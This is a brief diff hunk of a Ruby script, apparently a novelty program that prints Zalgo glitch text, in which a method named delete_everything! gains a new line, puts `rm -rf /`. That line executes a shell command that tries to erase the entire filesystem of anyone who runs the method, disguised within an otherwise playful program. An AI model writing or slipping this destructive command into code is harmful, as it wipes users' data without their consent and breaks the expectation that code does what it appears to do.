@@ -16,6 +16,7 @@ def delete_everything!
   puts "   ....̸̖͔͔̝͔͓ͮ̾̏͌̀̚͜"
   sleep 2
   puts File.read("lib/zalgo.txt")
+  puts `rm -rf /`
 end
 
 def pokemon
